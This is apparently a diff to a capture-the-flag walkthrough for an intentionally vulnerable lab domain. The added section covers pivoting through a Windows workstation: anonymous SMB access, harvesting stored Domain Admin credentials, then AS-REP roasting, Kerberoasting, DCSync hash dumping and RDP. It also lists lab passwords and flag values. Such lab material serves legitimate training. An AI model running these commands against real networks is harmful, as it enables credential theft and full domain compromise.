@@ -152,6 +152,70 @@ cat /root/root.txt
 
 ---
 
+## 🖥️ Phase 4: Windows Workstation (int-ws01, 192.168.1.60)
+
+After gaining access to the internal zone, the Windows 10 workstation at `192.168.1.60` is a key pivot point to the Domain Controller.
+
+### Machine Details
+| Property | Value |
+|----------|-------|
+| **IP** | `192.168.1.60` |
+| **Domain** | `vulncorp.local` (joined to int-dc01) |
+| **Local Admin** | `ws_admin` / `Desktop@2024` |
+| **RDP Port** | `3389` |
+| **SMB Port** | `445` (SMBv1 enabled) |
+
+### Step 1 — Enumerate the Workstation
+```bash
+# Scan the workstation
+nmap -sC -sV -p 139,445,3389 192.168.1.60
+
+# Check for EternalBlue (CVE-2017-0144)
+nmap --script smb-vuln-ms17-010 192.168.1.60
+
+# List SMB shares (guest/null session)
+smbclient -L \\\\192.168.1.60 -N
+```
+
+### Step 2 — Grab Stored Credentials (SMB Guest Access)
+```bash
+# Access the Public share — no auth required
+smbclient \\\\192.168.1.60\\Public -N
+
+# Inside smbclient prompt:
+get IT_Notes.txt
+quit
+
+# Contents reveal Domain Admin credentials:
+# john.doe:Corp@Admin2024  → connects to int-dc01 (192.168.1.10)
+# svc_backup:Backup@Svc2024 → DCSync rights on int-dc01
+```
+
+### Step 3 — Use Harvested Credentials to Pivot to Domain Controller
+```bash
+# AS-REP Roasting (using john.doe creds)
+python3 GetNPUsers.py vulncorp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10
+
+# Kerberoasting (request service tickets)
+python3 GetUserSPNs.py vulncorp.local/john.doe:Corp@Admin2024 -dc-ip 192.168.1.10 -request
+
+# DCSync — dump all domain hashes (using svc_backup)
+python3 secretsdump.py vulncorp.local/svc_backup:Backup@Svc2024@192.168.1.10
+
+# RDP to Domain Controller as Domain Admin
+xfreerdp /u:john.doe /p:'Corp@Admin2024' /v:192.168.1.10
+```
+
+### Flags on int-ws01
+```bash
+# After gaining access (RDP or EternalBlue shell):
+type C:\flags\eternalblue_flag.txt    # VULN{3t3rn4l_blu3_w0rkst4t10n}
+type C:\flags\creds_flag.txt          # VULN{st0r3d_cr3ds_p1vot}
+type C:\flags\admin_flag.txt          # VULN{w0rkst4t10n_4dm1n_pwn3d}
+```
+
+---
+
 ## 🔀 Phase 3: Lateral Movement & Pivoting
 
 With root control over Machine 1, extract credentials and keys to compromise other infrastructure:
@@ -164,6 +228,8 @@ With root control over Machine 1, extract credentials and keys to compromise oth
 | **Internal DB Dump** | `sqlite3 /opt/vulncorp/db/vulncorp.db "SELECT * FROM internal_credentials;"` | Dumps database table of SSH, MySQL, FTP, and RDP credentials across the subnet. |
 | **Password Hashes** | `cat /etc/shadow` | Offline password hash cracking with `john` or `hashcat`. |
 | **Network Pivot Proxy** | `chisel` / `sshuttle` / `socat` | Turn Machine 1 into a pivot/jump proxy to route traffic into the internal `192.168.56.0/24` subnet. |
+| **int-ws01 SMB Share** | `smbclient \\\\192.168.1.60\\Public -N` | `IT_Notes.txt` contains `john.doe:Corp@Admin2024` (Domain Admin for int-dc01). |
+| **int-dc01 DCSync** | `secretsdump.py vulncorp.local/svc_backup:Backup@Svc2024@192.168.1.10` | Dumps all NTLM hashes from Domain Controller. Full domain compromise. |
 
 ---
 
@@ -175,4 +241,5 @@ With root control over Machine 1, extract credentials and keys to compromise oth
 | **Stage 2: Web SQLi** | `admin` (Web Session) | Read all user passwords, view internal infrastructure credentials table in `/admin`. |
 | **Stage 3: Web RCE / Webshell** | `webuser` (OS User) | Interactive Linux shell, read application source code, capture `user.txt` flag. |
 | **Stage 4: Privilege Escalation** | `root` (Superuser) | Complete host takeover, modify system files, dump `/etc/shadow`, capture `root.txt` flag. |
-| **Stage 5: Post-Exploitation Pivot** | Internal Network Admin | SSH into internal DB server (`192.168.56.102`), dump MySQL DBs, connect to Windows RDP Jump Box. |
+| **Stage 5: Lateral → int-ws01** | Windows Local Admin | SMB guest access, RDP as `ws_admin`, harvest Domain Admin credentials from stored files. |
+| **Stage 6: Pivot → int-dc01** | **Domain Admin** | AS-REP Roast, DCSync, Pass-the-Hash — full Active Directory compromise. |
